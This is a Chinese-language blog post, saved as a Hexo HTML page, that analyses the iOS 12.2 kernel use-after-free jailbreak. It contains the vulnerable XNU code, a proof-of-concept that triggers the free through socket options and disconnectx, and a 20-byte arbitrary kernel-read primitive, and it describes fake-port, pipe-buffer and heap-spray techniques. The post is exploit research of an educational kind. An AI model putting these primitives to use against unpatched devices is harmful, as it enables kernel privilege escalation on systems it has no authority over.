@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>iOS12.2 jailbreak analysis | Peterpan0927&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="jailbreak analysis and rewrite on Mac">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="iOS12.2 jailbreak analysis">
+<meta property="og:url" content="https://peterpan980927.cn/2019/07/23/iOS12-2越狱漏洞分析/index.html">
+<meta property="og:site_name" content="Peterpan0927&#39;s Blog">
+<meta property="og:description" content="jailbreak analysis and rewrite on Mac">
+<meta property="og:locale" content="English">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g59nlkvcmbj30l80jojrz.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g59tuwlkgwj30b207sq35.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g5ax1hx0bjj31om0note6.jpg">
+<meta property="og:updated_time" content="2019-10-15T04:06:34.187Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="iOS12.2 jailbreak analysis">
+<meta name="twitter:description" content="jailbreak analysis and rewrite on Mac">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g59nlkvcmbj30l80jojrz.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Peterpan0927&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/p1.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://pbs.twimg.com/profile_images/1096645032407269376/9cO9fRMm_400x400.png">
+    <h2 class="author">Peterpan0927</h2>
+    <h3 class="description">how to reach the steins gate?</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>3</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-iOS12-2越狱漏洞分析" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/23/iOS12-2越狱漏洞分析/" class="article-date">
+  <time class="post-time" datetime="2019-07-23T02:39:33.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br/>
+    <span class="post-day">23</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      iOS12.2 jailbreak analysis
+    </h1>
+  
+
+        <div>
+          
+          
+              
+  &nbsp; | &nbsp;
+  <div class="view-box">
+    <span id="/2019/07/23/iOS12-2越狱漏洞分析/" class="leancloud_visitors" data-flag-title="iOS12.2 jailbreak analysis">
+      &nbsp;阅读次数<span class="leancloud-visitors-count"></span>
+    </span>
+  </div>
+
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>jailbreak analysis and rewrite on Mac</p>
+<a id="more"></a>
+<h1 id="0x0前言"><a href="#0x0前言" class="headerlink" title="0x0前言"></a>0x0前言</h1><p>p0的nedwill在同事的帮助下:)完成了<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806" target="_blank" rel="noopener">iOS12.2越狱</a>，这是一个UAF的洞，是通过<code>tfp0</code>的方式来拿到内核代码执行的权限，了，一般的利用方式我们都还是比较熟悉了，而且UAF的利用方式我们通常都是通过<code>ROP</code>的方式来提权，所以都要配合一个信息泄漏，所以这次的利用方式还是非常值得我们去学习的。通过代码结构来看应该是少不了bazad的帮助，通过他那个软件工程式的<code>exploit</code>就凸显了斯坦福博士的风格。不过整体都是C++下的看的着实有点难受。</p>
+<h1 id="0x1-漏洞"><a href="#0x1-漏洞" class="headerlink" title="0x1.漏洞"></a>0x1.漏洞</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">in6_pcbdetach(struct inpcb *inp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">true<span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">truetrue<span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">truetrue<span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line">truetrueinp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">truetrue<span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetruetruem_freem(inp-&gt;in6p_options);</span><br><span class="line">truetruetrueinp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">truetrue&#125;</span><br><span class="line">truetrueip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad</span></span><br><span class="line">truetrueROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">truetrue<span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">truetrue<span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetruetrue(<span class="keyword">void</span>) m_free(inp-&gt;inp_options); <span class="comment">// &lt;- good</span></span><br><span class="line">truetruetrueinp-&gt;inp_options = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里在进行资源释放的时候没有把<code>inp-&gt;in6p_outputopts</code>指向空，但是在<code>socket</code>断连再连接的时候就会造成<code>UAF</code>了，我看了一下<code>ip6_freepcbopts</code>这个函数，他将<code>in6p_outputopts</code>中的资源逐个释放并指向空，但很可惜忽略了他的上层。</p>
+<p>我们的poc如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DanglingOptions::DanglingOptions() : dangling_(<span class="literal">false</span>) &#123;</span><br><span class="line">  s_ = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">  <span class="keyword">if</span> (s_ &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"failed to create socket!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保证我们释放之后还可以进行setsockopt操作</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">so_np_extensions</span> <span class="title">sonpx</span> = &#123;</span>.npx_flags = SONPX_SETOPTSHUT,</span><br><span class="line">                                   .npx_mask = SONPX_SETOPTSHUT&#125;;</span><br><span class="line">  <span class="keyword">int</span> res = setsockopt(s_, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, <span class="keyword">sizeof</span>(sonpx));</span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"failed to enable setsockopt after disconnect!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  SetMinmtu(&amp;minmtu);</span><br><span class="line">  FreeOptions();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DanglingOptions::FreeOptions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (dangling_) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  dangling_ = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">//这个时候in6p_outputopts就已经被我们释放掉了</span></span><br><span class="line">  <span class="keyword">int</span> res = disconnectx(s_, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> res == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x2总体思路"><a href="#0x2总体思路" class="headerlink" title="0x2总体思路"></a>0x2总体思路</h1><p>整个利用的总体结构如下：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g59nlkvcmbj30l80jojrz.jpg" alt></p>
+<p>整体的结构还是比较好理解的，与之前的利用不一样的是，这里提出了几个不一样的技巧：</p>
+<ol>
+<li>fdofiles</li>
+</ol>
+<p>我们知道在一个进程的上下文中应该是会记录了这个进程打开的文件数量，有一个<code>array</code>来记录这些数据，这里正是利用了这一点，来获取管道的内核地址：</p>
+<blockquote>
+<p>task -&gt; proc -&gt; fd table -&gt; open files array (fd_ofiles)</p>
+<p>fd_ofiles -&gt; fileproc -&gt; f_fglob -&gt; fg_data -&gt; pipe -&gt; pipe buffer</p>
+</blockquote>
+<p>其中<code>fake port</code>的管道内核地址是为了构造<code>kernel task</code>，<code>uaf pipe</code>是为了释放掉它的<code>buffer</code>重新填充</p>
+<ol>
+<li>20字节的任意地址读</li>
+</ol>
+<p>首先来看看我们重用的那个对象的结构体：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g59tuwlkgwj30b207sq35.jpg" alt></p>
+<p>其中<code>pktinfo</code>是一个<code>union</code>，包含了<code>128 bit</code>的ipv6地址和一个4字节的整型<code>index</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_pktinfo</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">ipi6_addr</span>;</span>      <span class="comment">/* src/dst IPv6 address */</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>    ipi6_ifindex;   <span class="comment">/* send/recv interface index */</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
+<p>通过<code>getsockopt</code>中执行的对应<code>option</code>我们可以拿到这20字节的数据，也就是意味着每次我们通过触发UAF，然后将我们想要读取的内核地址数据堆喷上去，然后通过<code>api</code>再读回来。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过控制option name来取不同的属性</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DanglingOptions::GetIPv6Opt</span><span class="params">(<span class="keyword">int</span> option_name, <span class="keyword">void</span> *data, <span class="keyword">socklen_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> res = getsockopt(s_, IPPROTO_IPV6, option_name, data, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"GetIpv6Opt got %d\n"</span>, errno);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//buffer是我们堆喷的数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(buffer.get() + OFFSET(ip6_pktopts, ip6po_pktinfo), &amp;address_uint,</span><br><span class="line">         <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>));</span><br></pre></td></tr></table></figure>
+<p>可能不了解总的结构体的话还是会有些模糊：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">ip6_pktopts</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">ip6po_m</span>;</span>  <span class="comment">/* Pointer to mbuf storing the data */</span></span><br><span class="line">         <span class="keyword">int</span>     ip6po_hlim;     <span class="comment">/* Hoplimit for outgoing packets */</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Outgoing IF/address information */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">in6_pktinfo</span> *<span class="title">ip6po_pktinfo</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Next-hop address information */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6po_nhinfo</span> <span class="title">ip6po_nhinfo</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6_hbh</span> *<span class="title">ip6po_hbh</span>;</span> <span class="comment">/* Hop-by-Hop options header */</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Destination options header (before a routing header) */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6_dest</span> *<span class="title">ip6po_dest1</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Routing header related info. */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6po_rhinfo</span> <span class="title">ip6po_rhinfo</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">/* Destination options header (after a routing header) */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span>  <span class="title">ip6_dest</span> *<span class="title">ip6po_dest2</span>;</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">int</span>     ip6po_tclass;   <span class="comment">/* traffic class */</span></span><br><span class="line"> <span class="comment">//获取port的内核地址就是用了这个属性，minmtu取到高32位，prefer_tempaddr取到低32位（小端模式），通过((uint64_t)minmtu &lt;&lt; 32) | prefer_tempaddr 操作最后算出地址</span></span><br><span class="line">         <span class="keyword">int</span>     ip6po_minmtu;  <span class="comment">/* fragment vs PMTU discovery policy */</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">         <span class="keyword">int</span>     ip6po_prefer_tempaddr;  <span class="comment">/* whether temporary addresses are</span></span><br><span class="line"><span class="comment">                                            preferred as source address */</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">int</span> ip6po_flags;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
+<p>任意地址读相当于是用我们想要读取的数据覆盖<code>ip6po_pktinfo</code>指针，所以在取的时候会对这个指针的值解引用然后读取20字节的数据回来。这个做法很精妙但是不通用，只是针对于这个结构体而言的。</p>
+<ol>
+<li>uaf_pipe</li>
+</ol>
+<p>我们虽然构造了一个<code>fake port</code>但是苦于没有一个合法的<code>port name</code>进行操纵，所以就算我们把<code>kernel task</code>全都<code>dump</code>到了我们的<code>fake task</code>，也没办法进行任意地址读写，这里提出了一个新的<code>UAF pipe</code>，创建之后我们先通过任意地址读拿到它的内核地址信息，然后将它的<code>buffer</code>给释放掉，注意这里释放的只是<code>buffer</code>，而不是<code>pipe</code>。</p>
+<p>再通过堆喷大量的<code>ool ports</code>占据这块<code>buffer</code>，那么这个时候<code>buffer</code>中应该包含着刚刚堆喷的<code>port</code>的内核地址，最后将<code>uaf pipe</code>的首8个字节改写为<code>fake port</code>的地址，这就相当于我们拥有了一个可以操控<code>fake port</code>的<code>port name</code>了，最后我们接受消息，判断<code>port name</code>是否合法，如果合法说明我们已经拥有了最后的内核地址读写的权限了。</p>
+<ol>
+<li>heap spray</li>
+</ol>
+<p>我们知道做堆喷是有多种方式的，这里选择每一种都是有原因的，<code>ool ports</code>是为了<code>port name</code>，<code>IOSurface</code>是因为用起来很舒服，比较自由 ，所以除非是为了<code>fake port</code>，我们用的都是<code>IOSurface</code>的<code>set_value</code>。</p>
+<p>最后我对于C++写的实在有点难受，另外好久也没写利用了，有点手生，所以在Mac上用C写了一下：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g5ax1hx0bjj31om0note6.jpg" alt></p>
+<h1 id="0x3参考链接"><a href="#0x3参考链接" class="headerlink" title="0x3参考链接"></a>0x3参考链接</h1><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806" target="_blank" rel="noopener">bugs.chromium</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://peterpan980927.cn/2019/07/23/iOS12-2越狱漏洞分析/" data-id="ck6uoaoc50006pbpk0e92xqw2" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/08/08/Chrome引擎漏洞分析及利用/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Chrome Js engine attack analysis
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/07/08/JavaScript-in-V8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">JavaScript in V8</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Peterpan0927&#39;s Blog</h1>
+    <h2 class="blog-subtitle">Mind over muscle.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://pbs.twimg.com/profile_images/1096645032407269376/9cO9fRMm_400x400.png">
+    <h2 class="author">Peterpan0927</h2>
+    <h3 class="description">how to reach the steins gate?</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>3</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/Peterpan0927" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>Links</h2>
+      
+        <a class="hvr-bounce-in" href="https://www.imbajin.com" target="_blank" title="Jin">
+          Jin
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://yinwang0.wordpress.com" target="_blank" title="Yinwang(English)">
+          Yinwang(English)
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://www.yinwang.org" target="_blank" title="Yinwang(Chinese)">
+          Yinwang(Chinese)
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://gloxec.github.io/" target="_blank" title="gloxec">
+          gloxec
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2019 - 2020 Peterpan0927<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">HomePage</a>
+          
+            <a href="/tags" title="" class="menuItem">Tag</a>
+          
+            <a href="/about" title="" class="menuItem">About</a>
+          
+            <a href="/archives" title="" class="menuItem">Archives</a>
+          
+            <a href="https://github.com/Peterpan0927" title="" class="menuItem">Github</a>
+          
+            <a href="ftp://118.89.38.168" title="" class="menuItem">FTP</a>
+          
+        </div>
+        
+          <audio id="audio" src="plugin/galmenu/wulusai.mp3"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("Ljd6bJFL9N4tWj6WnGcbYUd2-gzGzoHsz", "xDGMWtxNt0aReJDVkuYmSqBd");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.article-title').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+  </div>
+</body>
+</html>
